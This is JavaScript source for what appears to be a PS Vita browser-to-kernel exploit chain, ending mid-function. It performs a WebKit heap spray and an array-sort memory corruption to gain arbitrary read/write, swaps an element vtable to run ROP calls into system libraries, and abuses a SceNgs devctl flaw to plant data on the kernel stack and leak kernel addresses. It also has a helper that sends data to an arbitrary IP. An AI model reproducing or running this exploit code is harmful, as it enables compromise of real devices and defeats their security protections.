// global vars
var _gc, _cnt = 0;

var caller = null;
var libraries = null;
var SceLibKernel = null;

var mod_info_list = {};

var sceKernelGetModuleList = null;
var sceKernelGetModuleInfo = null;

var aspace = null;
var aspace32 = null;
var aspace16 = null;

var sceSysmem_base = 0;
var kstack_addr = 0;

function refresh_mod_info_list(){
	var modnum = 0;
	var modnum_p = allocate_memory(4);
	var modids_p = allocate_memory(4 * 128);
	aspace32[modnum_p / 4] = 128;
	sceKernelGetModuleList(0xFF, modids_p, modnum_p);
	modnum = aspace32[modnum_p / 4];
	var SceKernelModuleInfo_p = allocate_memory(0x1B8);
	for (var i=0; i < modnum*4; i+=4) {
		var modid = aspace32[(modids_p+i) / 4];
		var ret = sceKernelGetModuleInfo(modid, SceKernelModuleInfo_p);
		if (ret != 0){
			logdbg("Failed to load module info with ID " + i / 4);
			continue;
		}
		var segment_info_p = SceKernelModuleInfo_p + 0x154;
		var mod_name_p = SceKernelModuleInfo_p + 0xC;
		var mod_path_p = SceKernelModuleInfo_p + 0x54;
		var mod_name = readNullTermString(mod_name_p);
		var mod_path = readNullTermString(mod_path_p);
		mod_info_list[mod_name] = {};
		mod_info_list[mod_name]["modid"] = modid;
		for (var j=0; j<4; j++) {
			var seg_addr = segment_info_p + j*0x18;
			if (aspace32[(seg_addr)/4] != 0x18)
				continue;
			var seg_str = "seg" + j;
			mod_info_list[mod_name][seg_str] = aspace32[(seg_addr+8) / 4];
		}
	}
}

function initMemoryHole() {
	try {
		var temp_offsets = wkexploit_offsets[window.psvita_fw];
		
		// Perform a heap spray
		const spray_size = 0x1000; // 0x1000 was not as much (OOM), 0xA000 is too big (can't find ArrayBufferView in memory)
        var spray = new Array(spray_size);
        for (var i = 0; i < spray.length; i++)
            spray[i] = new Uint32Array(0x1A7);
		
		var u32 = new Uint32Array(8);
		var a1 = [0, 1, 2, 3, u32];
		var a2 = [0, 1, 2, 3, 4]; // right after a1
		var a1len = a1.length;
		var a2len = a2.length;
		var u32len = u32.length;

		if (!_gc)
			_gc = new Array();
		_gc.push(u32, a1, a2);

		var myCompFunc = function(x, y){
			if (y == 3 && x == u32)
				a1.shift();
			return 0;
		}

		a1.sort(myCompFunc);

		var u32addr = a2.length;
		if (u32addr == a2len) {
			logdbg("Error: 1");
			return -1;
		}

		myCompFunc = function(x, y){
			if (y == 0 && x == 1) {
				a1.length = a1len;
				a1.shift();
				a2.length = u32addr + 0x28;
			}
			if (y == 3)
				a1.unshift(0);
			return 0;
		}

		a1.sort(myCompFunc);

		var c = a2.length;
		if (c != u32addr + 0x28) {
			logdbg("error: 2");
			a1[3] = 0;
			return -1;
		}

		var mo = {};
			var pd = {
			get: function(){return 0;},
			set: function(arg){return 0;},
			enumerable:true,
			configurable:true
		};

		var a3 = [0, 1, 2, a1[3]];

		Object.defineProperty(mo, "prop0", pd);
		for (var i=1; i < 7; i++)
			mo["prop"+i] = i;

		_gc.push(a3, mo, pd);

		myCompFunc = function(x, y) {
			if (y == 2)
				a3.shift();
			return 0;
		}

		a3.sort(myCompFunc);
		a1[3] = 0;
		a3[3] = 0;

		// setup GetterSetter
		u32.prop1 = 8;  // 8 = JSType.GetterSetterType
		u32.prop2 = 8;
		u32.prop3 = 8;
		u32.prop4 = u2d(u32addr, u32addr+0x10); // ((GetterSetter)mo.prop0).m_structure

		var f = new Function(" return 876543210 + " + (_cnt++) + ";");
		f.prop2 = u2d(0x40000000, 0x40000000); // a new value for u32.length
		f();
		pd.get = f;
		Object.defineProperty(mo, "prop0", pd);
		delete mo.prop0;

		if (u32.length == u32len) {
			logdbg("Error: 3");
			return -1;
		}

		// Spray memory with ArrayBuffers that will be used to get arbitrary read/write
		var spraysiz = 0x1000

		sprays = new Array(spraysiz);
		_gc.push(sprays);

		for (var o = 0; o < spraysiz; o++) {
			buf = new ArrayBuffer(0xABC0);
			_gc.push(buf);
			sprays[o] = buf;
		}

		var idx = -1;		// index in u32 to size of object
		var baseaddr = -1;	// base address of object

		for (var j = 0x60000; j < 0x200000; j++) {
			if (u32[j] == 0xABC0) {
				baseaddr = u32[j-1];
				idx = j;
				break;
			}
		}

		if (idx == -1) {
			logdbg("Error: 4");
			return -1;
		}

		logdbg("idx : 0x" + idx.toString(16)); // idx: min: 0x60d86 ? - max: 0x83e2c

		var espraysiz = 0x2000

		esprays = new Array(espraysiz);
		_gc.push(esprays);

		for (var o = 0; o < espraysiz; o++) {
			var e = document.createElement("textarea");
			e.rows = 0x66656463;
			_gc.push(e);
			esprays[o] = e;
		}

		var eidx = -1;       // index in u32 to size of object
		var eleobj = -1;
		var arrobj = -1;

		for (var j = 0x0; j < 0x600000; j+=2) {
			if (u32[j] == 0x66656463) {
				u32[(eidx == -1) ? j : eidx] = 0x66656463;
				eidx = j;
				u32[eidx] = 0x55555555;
				for (var l = 0; l < espraysiz; l++) {
					var t = esprays[l];
					if(t.rows == 0x55555555){
						eleobj = t;
						j = 0xFFFFFFFF;
						break;
					}
				}
			}
		}
		if(eidx == -1){logdbg("Error: 5");return -1;}

		if (eleobj == -1) {
			logdbg("Error: 6");
			logdbg("eidx : 0x" + eidx.toString(16));
			return -1;
		}

		u32[idx] = 0xdeadbabe;

		for (var l = 0; l < spraysiz; l++) {
			var t = sprays[l];
			if (t.byteLength == 0xdeadbabe) {
				arrobj = t;
				break;
			}
		}

		if (arrobj == -1) {
			logdbg("Error: 7");
			return -1;
		}

		var u32base = u32[0x40000000 - 2];

		u32[idx - 1] = 0x0;                                                 // modify base pointer of ArrayBuffer object
		u32[idx] = 0xffffff00;                                              // modify size of ArrayBuffer object
		aspace = new Uint8Array(arrobj);
		aspace32 = new Uint32Array(arrobj);
		aspace16 = new Uint16Array(arrobj);

		allocate_memory = init_memory(u32base - 0x400000);                  // our memory allocator

		var vtab = aspace32[(u32addr / 4)];                                 // vtable of u32
		var leakedptr = aspace32[(vtab + 0x48) / 4];                        // leak a pointer in .text of SceWebkit

		var sceWebKit_base = leakedptr - temp_offsets.sceWebKit_base_off;                  // base address of SceWebkit module
		var sceLibc_base = get_base_from_offsets(sceWebKit_base, temp_offsets.sceLibc_entry_off, temp_offsets.sceLibc_base_off);
		var sceNet_base = get_base_from_offsets(sceWebKit_base, temp_offsets.sceNet_entry_off, temp_offsets.sceNet_base_off);
		var sceLibKernel_base = get_base_from_offsets(sceWebKit_base, temp_offsets.sceLibKernel_entry_off, temp_offsets.sceLibKernel_base_off);

		// Create fake vtable and replace old one
		var vtoffset = temp_offsets.elementvtable_off;                           // offset to vtable ptr from rows field of Element
		var scrollvoffset = temp_offsets.setscrollleft_off;                      // offset to setScrollLeft() vptr from beggining of vtable
		var vtidx = ((u32base + (eidx * 4) )+ vtoffset);                    // ptr to vtable
		var vtptr = aspace32[vtidx / 4];                                    // actual vtable pointer

		var fkvtable = allocate_memory(0x400 * 4);                          // address of fake vtable

		// Copy vtable into fkvtable
		for (var i = 0; i < 0x400; i++)
			aspace32[(fkvtable + (i << 2))/ 4] = aspace32[(vtptr + (i << 2)) / 4];

		// Replace vtable with fkvtable
		aspace32[vtidx / 4] = fkvtable;

		// Initialize ROP gadgets and library functions
		bases = {
			"SceWebkit": sceWebKit_base,
			"SceLibKernel": sceLibKernel_base,
			"SceNet": sceNet_base,
			"SceLibc": sceLibc_base
		};

		var tmpmem = allocate_memory(0x5000);
		caller = get_caller(tmpmem, eleobj, vtidx, fkvtable);
		libraries = init_ggts(bases, caller, window.psvita_fw);
		
		SceLibKernel = libraries.SceLibKernel.functions;

		var syscall_a = sceLibKernel_base + 0x5B2C;
		sceKernelGetModuleList = sceKernelGetModuleList_caller(caller(syscall_a+16, libraries));
		sceKernelGetModuleInfo = sceKernelGetModuleInfo_caller(caller(syscall_a+32, libraries));

		refresh_mod_info_list();

		var test_ret = 0x80000000;

		logdbg("" + (test_ret >> 0));
		logdbg("" + (test_ret >>> 0));

		return aspace;
	} catch(e) {
		logdbg("Error: " + e.line + " " + e);
		return -1;
	}

	return -1;
}

var SCE_NET_AF_INET = 2;
var SCE_NET_SOCK_STREAM = 1;
var SIZEOF_SIN = 16;
var SCE_NET_SO_RCVTIMEO = 0x1006;
var SCE_NET_SOL_SOCKET = 0xffff;

// Macros
var MODINFO_SIZE = 0x5c;
var MOD_SIG = "Sce";
var MAXSTR_SIZE = 27;
var MODX_SIZE = 0x20;
var MODIM_SIZE = 0x34;

// List directory files
function list_dir(dirname) {
	var dirlist = allocate_memory(0x1000);
	var fd = SceLibKernel.sceIoDopen(stringify(dirname));
	var _fd = Int(fd);
	if (_fd < 0) {
		logdbg("sceIoDopen() failed : " + fd.toString(16));
		return;
	}
	logdbg("Listing: " + dirname);
	while (SceLibKernel.sceIoDread(fd, dirlist) > 0) {
		myprintf(dirlist + 0x58);
		logdbg("size : " + aspace32[(dirlist+8) / 4] + "byte");
	}
	SceLibKernel.sceIoDclose(fd);
}

// Connect to ip on given port and send msg
function socket_send(ip, port, msg) {
    var scenet = libraries.SceNet.functions;
    var sockaddr = allocate_memory(32); 

    mymemset(sockaddr, 0, SIZEOF_SIN);

    aspace[sockaddr] = SIZEOF_SIN;
    aspace[sockaddr + 1] = SCE_NET_AF_INET;

    var PORT = port;
    logdbg("Calling nethtons()");
    var r = scenet.sceNetHtons(PORT); 
    logdbg("-> 0x" + r.toString(16) + "\n"); 
    aspace16[((sockaddr + 2) / 2)] = r;

    aspace32[(sockaddr + 4) / 4] = inet_addr(ip);

    var dbgname = "test_socket\x00";
    logdbg("Calling SceNetSocket()");
    var sockfd = scenet.sceNetSocket(stringify(dbgname), SCE_NET_AF_INET, SCE_NET_SOCK_STREAM, 0);
    logdbg("-> 0x" + sockfd.toString(16) + "\n"); 

    logdbg("Calling SceNetConnect()");
    var r = scenet.sceNetConnect(sockfd, sockaddr, SIZEOF_SIN); 
    logdbg("-> 0x" + r.toString(16) + "\n"); 

    logdbg("Calling SceNetSend()");
    var sent = scenet.sceNetSend(sockfd, stringify(msg), msg.length, 0);
    logdbg("-> 0x" + sent.toString(16) + "\n"); 

    logdbg("Calling SceNetClose()");
    var sent = scenet.sceNetSocketClose(sockfd, 0, 0, 0);
    logdbg("-> 0x" + sent.toString(16) + "\n"); 
}

////////////////////////////////////////////////////////////////////////////////
///////// TO CLEAN
////////////////////////////////////////////////////////////////////////////////

//SceDriverUser base + 0x3739
//ConvertVs0UserDrivePath
//sceAppMgrConvertVs0UserDrivePath
function sceAppMgrConvertVs0UserDrivePath_caller(caller) {
    return function(path) {
        MOUNT_PATH_LENGTH = 0x100;
        var mount_a = allocate_memory(MOUNT_PATH_LENGTH);
        var return_code = caller(stringify(path), mount_a, MOUNT_PATH_LENGTH);
        logdbg("DEBUG: return code: 0x" + return_code.toString(16));
        //do_read(aspace, mount_a, MOUNT_PATH_LENGTH);
        //do_read(aspace, stringify(path), path.length);
		
        var mount = "broken (fixme)";
        return [return_code, mount];
    }
}

//thanks @nas_plugin
function sceSysmoduleLoadModule_caller(caller) {
    return function (mod_id) {
        var return_code = caller(mod_id);
        return return_code;
    }
}

function sceKernelGetModuleInfo_caller(caller) {
	return function(UID, m_mod_info_p){
		var return_code = caller(UID, m_mod_info_p);
		return return_code;
	}
}

function sceKernelLoadModule_caller(caller){
    return function (path) {
        var MAX_LOADED_MODS = 128;
        var num_loaded = MAX_LOADED_MODS;
        var modlist_a = allocate_memory(MAX_LOADED_MODS*4);
        var num_loaded_a = allocate_memory(0x4);
        aspace32[num_loaded_a / 4] = num_loaded;

        var return_code = caller(0xFF, modlist_a, num_loaded_a);
        return [return_code,modlist_a,num_loaded_a];
    }
}

function sceKernelGetModuleList_caller(caller) {
	return function(flags, modids_p, num_p) {
		return caller(flags, modids_p, num_p);
	}
}

function sceAppMgrLaunchAppByUri_caller(caller) {
	return function(flags, uri_p) {
		return caller(flags, uri_p);
	}
}

function sceAppMgrLoadExec_caller(caller){
	return function(appPath_p, argv_p, optParam_p){
		return caller(appPath_p, argv_p, optParam_p);
	}
}

function sceIoOpen_caller(caller){
	return function(path_p, flags, mode){

		var return_code = caller(path_p, flags, mode);
		return return_code;
	}
}

function sceIoWrite_caller(caller){
	return function(fd, data_p, size){
		return caller(fd, data_p, size);
	}
}

function sceIoRead_caller(caller){
	return function(fd, data_p, size){
		return caller(fd, data_p, size);
	}
}

function sceIoClose_caller(caller){
	return function(fd){
		return caller(fd);
	}
}

function sceDisplaySetFrameBuf_caller(caller){
	return function(pParam, sync){
		return caller(pParam, sync);
	}
}

//SceUID sceKernelAllocMemBlock(const char *name, SceKernelMemBlockType type, int size, SceKernelAllocMemBlockOpt *optp);
function sceKernelAllocMemBlock_caller(caller){
	return function(name_p, type, size, opt_p){
		return caller(name_p, type, size, opt_p);
	}
}

//int sceKernelFreeMemBlock(SceUID uid);
function sceKernelFreeMemBlock_caller(caller){
	return function(uid){
		return caller(uid);
	}
}

//int sceKernelGetMemBlockBase(SceUID uid, void **basep);
function sceKernelGetMemBlockBase_caller(caller){
	return function(uid, basep){
		return caller(uid, basep);
	}
}

function SceWebFiltering_BFFD2DB1_caller(caller){
	return function(){
		return caller();
	}
}

//int SceWebFiltering_45C62364(int arg1);
//int SceWebFiltering_BFFD2DB1();

function sceShellUtilInitEvents_caller(caller){
	return function(unk){
		return caller(unk);
	}
}

function sceShellUtilLock_caller(caller){
	return function(type){
		return caller(type);
	}
}

function sceShellUtilUnlock_caller(caller){
	return function(type){
		return caller(type);
	}
}

function sceNgsSystemGetRequiredMemorySize_caller(caller){
	return function(pSynthParams, pnSize){

		var return_code = caller(pSynthParams, pnSize);
		return return_code;
	}
}

function sceNgsSystemInit_caller(caller){
	return function(pSynthSysMemory, uMemSize, pSynthParams, pSystemHandle){

		var return_code = caller(pSynthSysMemory, uMemSize, pSynthParams, pSystemHandle);
		return return_code;
	}
}

function sceNgsRackGetRequiredMemorySize_caller(caller){
	return function(hSystemHandle, pRackDesc, pnSize){

		var return_code = caller(hSystemHandle, pRackDesc, pnSize);
		return return_code;
	}
}

function sceNgsRackInit_caller(caller){
	return function(hSystemHandle, pRackBuffer, pRackDesc, pRackHandle){

		var return_code = caller(hSystemHandle, pRackBuffer, pRackDesc, pRackHandle);
		return return_code;
	}
}

function sceNgsRackRelease_caller(caller){
	return function(hRackHandle, callbackFuncPtr){

		var return_code = caller(hRackHandle, callbackFuncPtr);
		return return_code;
	}
}
////////////////////////////////////////////////////////////////////////////////







function sceSysmoduleLoadModule(id) {
	var _sceSysmoduleLoadModule = sceSysmoduleLoadModule_caller(caller(mod_info_list["SceWebKitProcess"]["seg0"] + 0x124F8, libraries));
	return _sceSysmoduleLoadModule(id);
}

function sceAppMgrLaunchAppByUri(flags, uri) {
	var _sceAppMgrLaunchAppByUri = sceAppMgrLaunchAppByUri_caller(caller(mod_info_list["SceDriverUser"]["seg0"] + 0x35d5, libraries));
	return _sceAppMgrLaunchAppByUri(flags, stringify(uri));
}

function sceAppMgrLoadExec(path) {
	var _sceAppMgrLoadExec = sceAppMgrLoadExec_caller(caller(mod_info_list["SceDriverUser"]["seg0"] + 0x3091, libraries));
	return _sceAppMgrLoadExec(stringify(path), 0, 0);
}

function sceAppMgrLaunchAppByUri_user() {
	var uri = "";
	uri += "video:\n";
	uri += "photo:\n";
	uri += "music:\n";
	uri += "settings_dlg:\n";
	uri += "psgm:open?titleid=NPXS10031\n";
	var exec_uri = prompt(uri, "psgm:open?titleid=NPXS10031");
	var _sceAppMgrLaunchAppByUri = sceAppMgrLaunchAppByUri_caller(caller(mod_info_list["SceDriverUser"]["seg0"] + 0x35d5, libraries));
	_sceAppMgrLaunchAppByUri(0xFFFFF, stringify(exec_uri));
}

var	SCE_KERNEL_MEMBLOCK_TYPE_USER_RW_UNCACHE          = 0x0C208060,
	SCE_KERNEL_MEMBLOCK_TYPE_USER_RW                  = 0x0C20D060,
	SCE_KERNEL_MEMBLOCK_TYPE_USER_MAIN_PHYCONT_RW     = 0x0C80D060,
	SCE_KERNEL_MEMBLOCK_TYPE_USER_MAIN_PHYCONT_NC_RW  = 0x0D808060,
	SCE_KERNEL_MEMBLOCK_TYPE_USER_CDRAM_RW            = 0x09408060;

function sceKernelAllocMemBlock_test(){
	var sceKernelFreeMemBlock = sceKernelFreeMemBlock_caller(caller(mod_info_list["SceDriverUser"]["seg0"]+0x1214, libraries));
	var sceKernelGetMemBlockBase = sceKernelGetMemBlockBase_caller(caller(mod_info_list["SceDriverUser"]["seg0"]+0x1224, libraries));
	var sceKernelAllocMemBlock = sceKernelAllocMemBlock_caller(caller(mod_info_list["SceDriverUser"]["seg0"]+0x1234, libraries));
	var sceDisplaySetFrameBuf = sceDisplaySetFrameBuf_caller(caller(mod_info_list["SceDriverUser"]["seg0"]+0x2ff9, libraries));
	
	var uid = sceKernelAllocMemBlock(stringify("test_mem_get"), SCE_KERNEL_MEMBLOCK_TYPE_USER_RW_UNCACHE, 0x200000, 0);
	logdbg("sceKernelAllocMemBlock : " + uid.toString(16));

	var base_pp = allocate_memory(4);
	sceKernelGetMemBlockBase(uid, base_pp);

	var base_p = aspace32[base_pp / 4];
	logdbg("base_p : " + base_p.toString(16));

	var SceLibKernel = libraries.SceLibKernel.functions;
	SceLibKernel.sceClibMemset(base_p, 0xFF, 0x200000);

	var display_p = allocate_memory(4*6);

	aspace32[(display_p+0x00) / 4] = (4*6);
	aspace32[(display_p+0x04) / 4] = base_p;
	aspace32[(display_p+0x08) / 4] = 960;
	aspace32[(display_p+0x0C) / 4] = 0;
	aspace32[(display_p+0x10) / 4] = 960;
	aspace32[(display_p+0x14) / 4] = 544;

	//for(;;)
		sceDisplaySetFrameBuf(display_p, 1);

	sceKernelFreeMemBlock(uid);
}





function SceWebFiltering_BFFD2DB1_test(){

	var SceWebFiltering_BFFD2DB1 = SceWebFiltering_BFFD2DB1_caller(caller(mod_info_list["SceWebKitProcess"]["seg0"]+0x12998, libraries));

	var ret = SceWebFiltering_BFFD2DB1();

	logdbg("SceWebFiltering_BFFD2DB1 : " + ret.toString(16));
}




var	SCE_O_RDONLY    = 0x0001,
	SCE_O_WRONLY    = 0x0002,
	SCE_O_RDWR      = (SCE_O_RDONLY | SCE_O_WRONLY),
	SCE_O_NBLOCK    = 0x0004,
	SCE_O_DIROPEN   = 0x0008,
	SCE_O_RDLOCK    = 0x0010,
	SCE_O_WRLOCK    = 0x0020,
	SCE_O_APPEND    = 0x0100,
	SCE_O_CREAT     = 0x0200,
	SCE_O_TRUNC     = 0x0400,
	SCE_O_EXCL      = 0x0800,
	SCE_O_SCAN      = 0x1000,
	SCE_O_RCOM      = 0x2000,
	SCE_O_NOBUF     = 0x4000,
	SCE_O_NOWAIT    = 0x8000,
	SCE_O_FDEXCL    = 0x01000000,
	SCE_O_PWLOCK    = 0x02000000,
	SCE_O_FGAMEDATA = 0x40000000;

function IoWriteTest(){
	var fd = SceLibKernel.sceIoOpen(stringify("savedata0:data.bin"), SCE_O_WRONLY | SCE_O_CREAT | SCE_O_TRUNC, 0666);
	logdbg("sceIoOpen('savedata0:data.bin') : 0x" + fd.toString(16));

	SceLibKernel.sceIoWrite(fd, stringify("I am the message written"), 0x400);
	SceLibKernel.sceIoClose(fd);
}

function IoReadTest() {	
	var fd = SceLibKernel.sceIoOpen(stringify("savedata0:data.bin"), SCE_O_RDONLY, 0666);
	logdbg("sceIoOpen('savedata0:data.bin') : 0x" + fd.toString(16));

	var read_p = allocate_memory(0x100);
	SceLibKernel.sceIoRead(fd, read_p, 0x100);
	SceLibKernel.sceIoClose(fd);

	myhexdump(read_p, 0x100);
}

function print_mod_list(){
	var modnum = 0;
	var modnum_p = allocate_memory(4);
	var modids_p = allocate_memory(4 * 128);
	aspace32[modnum_p/4] = 128;
	sceKernelGetModuleList(0xFF, modids_p, modnum_p);
	modnum = aspace32[modnum_p / 4];
	var SceKernelModuleInfo_p = allocate_memory(0x1B8);
	for (var i=0; i < modnum * 4; i+=4) {
		var modid = aspace32[(modids_p + i) / 4];
		var ret = sceKernelGetModuleInfo(modid, SceKernelModuleInfo_p);
		var segment_info_p = SceKernelModuleInfo_p + 0x154;
		var mod_name_p = SceKernelModuleInfo_p + 0xC;
		var mod_path_p = SceKernelModuleInfo_p + 0x54;
		var mod_name = readNullTermString(mod_name_p);
		var mod_path = readNullTermString(mod_path_p);
		logdbg(mod_name);
		logdbg(mod_path);
		for (var j=0; j<4; j++) {
			var seg_addr = segment_info_p + j*0x18;
			if (aspace32[(seg_addr) / 4] != 0x18)
				continue;
		}
	}
}

var	SCE_SHELL_UTIL_LOCK_TYPE_PS_BTN             = 0x1,
	SCE_SHELL_UTIL_LOCK_TYPE_QUICK_MENU         = 0x2,
	SCE_SHELL_UTIL_LOCK_TYPE_POWEROFF_MENU      = 0x4,
	SCE_SHELL_UTIL_LOCK_TYPE_UNK8               = 0x8,
	SCE_SHELL_UTIL_LOCK_TYPE_USB_CONNECTION     = 0x10,
	SCE_SHELL_UTIL_LOCK_TYPE_MC_INSERTED        = 0x20,
	SCE_SHELL_UTIL_LOCK_TYPE_MC_REMOVED         = 0x40,
	SCE_SHELL_UTIL_LOCK_TYPE_UNK80              = 0x80,
	SCE_SHELL_UTIL_LOCK_TYPE_UNK100             = 0x100,
	SCE_SHELL_UTIL_LOCK_TYPE_UNK200             = 0x200,
	SCE_SHELL_UTIL_LOCK_TYPE_MUSIC_PLAYER       = 0x400,
	SCE_SHELL_UTIL_LOCK_TYPE_PS_BTN_2           = 0x800; //! without the stop symbol



function sceShellUtilInitEvents(unk){
	var _sceShellUtilInitEvents = sceShellUtilInitEvents_caller(caller(mod_info_list["SceShellSvc"]["seg0"]+0xc6ed, libraries));

	var ret = _sceShellUtilInitEvents(unk);

	logdbg("sceShellUtilInitEvents : 0x" + ret.toString(16));

}


function sceShellUtilLock(type){
	var _sceShellUtilLock = sceShellUtilLock_caller(caller(mod_info_list["SceShellSvc"]["seg0"]+0xca1b, libraries));

	var ret = _sceShellUtilLock(type);

	logdbg("sceShellUtilLock : 0x" + ret.toString(16));

}

function sceShellUtilUnlock(type){
	var _sceShellUtilUnlock = sceShellUtilUnlock_caller(caller(mod_info_list["SceShellSvc"]["seg0"]+0xcb31, libraries));

	var ret = _sceShellUtilUnlock(type);

	logdbg("sceShellUtilUnlock : 0x" + ret.toString(16));

}



var	SCE_NGS_VOICE_DEFINITION_XOR	= 0x9e28dcce,
	SCE_NGS_VOICE_DEFINITION_MAGIC	= 0x66647662,
	SCE_NGS_VOICE_DEFINITION_FLAGS	= 0x00010001,
	SCE_NGS_ERROR_INVALID_PARAM	= 0x804a0002,

	PRESET_LIST_OFFSET		= 0x130,
	FAKE_COPYOUT_OFFSET		= 0x40,
	FAKE_COPYOUT_SIZE		= 0xA0,
	COPYOUT_PARAMS_OFFSET		= 0xA0,

	KSTACK_DEVCTL_INDATA_OFFSET	= 0x700,	// 3.15

	KSTACK_SIZE			= 0x1000,
	KSTACK_SYSMEM_OFFSET		= 0x89C,
	SCE_SYSMEM_OFFSET		= -0x117eb,

	KSTACK_BASE_START		= 0x1000,
	KSTACK_BASE_STEP		= 0x1000,

	SCE_OK				= 0x0;

var prame_size_p = null;
var s_sysHandle;

var sceNgsSystemGetRequiredMemorySize	= null;
var sceNgsSystemInit			= null;

var sceNgsRackGetRequiredMemorySize	= null;
var sceNgsRackInit			= null;
var sceNgsRackRelease			= null;


function Load_SceNgsUser() {
	var sceSysmoduleLoadModule = sceSysmoduleLoadModule_caller(caller(mod_info_list["SceWebKitProcess"]["seg0"]+0x124F8, libraries));

	var ret = sceSysmoduleLoadModule(0x0B);
	logdbg("Load SceNgsUser : " + ret);
	refresh_mod_info_list();

	return ret;
}

function ngs_init() {
	sceNgsSystemGetRequiredMemorySize = sceNgsSystemGetRequiredMemorySize_caller(caller(mod_info_list["SceNgsUser"]["seg0"]+0x54D, libraries));
	sceNgsSystemInit = sceNgsSystemInit_caller(caller(mod_info_list["SceNgsUser"]["seg0"]+0x57D, libraries));

	sceNgsRackGetRequiredMemorySize = sceNgsRackGetRequiredMemorySize_caller(caller(mod_info_list["SceNgsUser"]["seg0"]+0x8d1, libraries));
	sceNgsRackInit = sceNgsRackInit_caller(caller(mod_info_list["SceNgsUser"]["seg0"]+0x90d, libraries));
	sceNgsRackRelease = sceNgsRackRelease_caller(caller(mod_info_list["SceNgsUser"]["seg0"]+0xa25, libraries));

	var ret = 0;
	prame_size_p = allocate_memory(4);
	var ngs_init_prame_p = allocate_memory(4*5);

	aspace32[(ngs_init_prame_p+0x0)/4] = 2;
	aspace32[(ngs_init_prame_p+0x4)/4] = 2;
	aspace32[(ngs_init_prame_p+0x8)/4] = 512;
	aspace32[(ngs_init_prame_p+0xC)/4] = 48000;
	aspace32[(ngs_init_prame_p+0x10)/4] = 1;

	aspace32[(ngs_init_prame_p/4)+0x0] = 2;
	aspace32[(ngs_init_prame_p/4)+0x1] = 2;
	aspace32[(ngs_init_prame_p/4)+0x2] = 512;
	aspace32[(ngs_init_prame_p/4)+0x3] = 48000;
	aspace32[(ngs_init_prame_p/4)+0x4] = 1;

	ret = sceNgsSystemGetRequiredMemorySize(ngs_init_prame_p, prame_size_p);

	var prame_size = aspace32[prame_size_p/4];

	logdbg("sceNgsSystemGetRequiredMemorySize : 0x" + ret.toString(16));
	logdbg("prame_size : 0x" + prame_size.toString(16));

	var s_pSysMem_p = allocate_memory(prame_size*2);
	var s_sysHandle_p = allocate_memory(4);

	ret = sceNgsSystemInit(s_pSysMem_p, prame_size, ngs_init_prame_p, s_sysHandle_p);

	s_sysHandle = aspace32[s_sysHandle_p/4];
	logdbg("sceNgsSystemInit : 0x" + ret.toString(16));
	logdbg("s_sysHandle : 0x" + s_sysHandle.toString(16));
}

var voiceDef_p = null;
var SceNgsRackDescription_p = null;
var kstack_base = KSTACK_BASE_START - KSTACK_BASE_STEP + KSTACK_DEVCTL_INDATA_OFFSET;

function get_kstack_addr() {
	var ret = 0;
	voiceDef_p = allocate_memory(0x400);
	SceNgsRackDescription_p = allocate_memory(4*6);

	aspace32[(SceNgsRackDescription_p+0x00) / 4] = 0;
	aspace32[(SceNgsRackDescription_p+0x04) / 4] = 1;
	aspace32[(SceNgsRackDescription_p+0x08) / 4] = 1;
	aspace32[(SceNgsRackDescription_p+0x0C) / 4] = 0;
	aspace32[(SceNgsRackDescription_p+0x10) / 4] = 0;
	
	mymemset(voiceDef_p, 0, 0x400);
	aspace32[(voiceDef_p + 0x00) / 4] = SCE_NGS_VOICE_DEFINITION_MAGIC;
	aspace32[(voiceDef_p + 0x04) / 4] = SCE_NGS_VOICE_DEFINITION_FLAGS;
	aspace32[(voiceDef_p + 0x08) / 4] = 0x40;
	aspace32[(voiceDef_p + 0x0C) / 4] = 0x40;

	SceLibKernel.sceIoDevctl(stringify("\0\0\0"), 0, voiceDef_p, 0x3FF, 0, 0);

	for (var addr = KSTACK_DEVCTL_INDATA_OFFSET; addr < 0x3000000; addr += 0x1000){
		aspace32[(SceNgsRackDescription_p + 0x00) / 4] = (addr ^ SCE_NGS_VOICE_DEFINITION_XOR);
		ret = sceNgsRackGetRequiredMemorySize(s_sysHandle, SceNgsRackDescription_p, prame_size_p);
		if (ret != SCE_NGS_ERROR_INVALID_PARAM) {
			kstack_base = addr + -KSTACK_DEVCTL_INDATA_OFFSET;
			kstack_addr = kstack_base;
			break;
		}
	}

	logdbg("kstack_base : 0x" + kstack_base.toString(16));
	//logdbg("ret : 0x" + ret.toString(16));

	return ret;
}

function set_preset(i, src, size) {
	var index = i*0x18;
	var offset = src - (PRESET_LIST_OFFSET + index);

	mymemset(voiceDef_p + (PRESET_LIST_OFFSET + index), 0, 0x18);

	aspace32[(voiceDef_p + (PRESET_LIST_OFFSET + index + 0x08)) / 4] = offset;
	aspace32[(voiceDef_p + (PRESET_LIST_OFFSET + index + 0x0C)) / 4] = size;
}

function trigger_exploit() {
	var rack_handle_p = allocate_memory(0x4);
	var buffer_info_p = allocate_memory(0x4 * 2);

	// Plant fake voice definition into kernel stack
	SceLibKernel.sceIoDevctl(stringify("\0\0\0"), 0, voiceDef_p, 0x3ff, 0, 0);

	// Determine memory requirement for rack
	sceNgsRackGetRequiredMemorySize(s_sysHandle, SceNgsRackDescription_p, (buffer_info_p + 4));

	var buffer_info_size = aspace32[(buffer_info_p + 4) / 4];

	// Allocate rack memory
	aspace32[(buffer_info_p + 0) / 4] = allocate_memory(buffer_info_size);

	// Call vulnerable function
	var ret = sceNgsRackInit(s_sysHandle, buffer_info_p, SceNgsRackDescription_p, rack_handle_p);


	// Release rack handle
	var rack_handle = aspace32[(rack_handle_p + 0) / 4];
	sceNgsRackRelease(rack_handle, 0);
}

function leak_sysmem_ngsuser() {
	// Set presets information in voice definition
	aspace32[(voiceDef_p + 0x30) / 4] = PRESET_LIST_OFFSET;
	aspace32[(voiceDef_p + 0x34) / 4] = 2;

	// Set presets
	set_preset(0, 0, -(0x148 + 2 * 0x18) + COPYOUT_PARAMS_OFFSET);
	set_preset(1, FAKE_COPYOUT_OFFSET, FAKE_COPYOUT_SIZE);

	var sceSysmem_base_p = allocate_memory(4);

	// Overwrite copyout's dst, src and len
	mymemset((voiceDef_p + FAKE_COPYOUT_OFFSET), 0, FAKE_COPYOUT_SIZE);
	aspace32[(voiceDef_p + (FAKE_COPYOUT_OFFSET + 0x04)) / 4] = sceSysmem_base_p;
	aspace32[(voiceDef_p + (FAKE_COPYOUT_OFFSET + 0x08)) / 4] = kstack_addr + 0x89C; //KSTACK_SYSMEM_OFFSET;
	aspace32[(voiceDef_p + (FAKE_COPYOUT_OFFSET + 0x1C)) / 4] = 4;

	// Trigger exploit
	trigger_exploit();

	sceSysmem_base = aspace32[(sceSysmem_base_p)/4];

	logdbg("kstack[0x89c] -> sysmem_addr : 0x" + sceSysmem_base.toString(16));

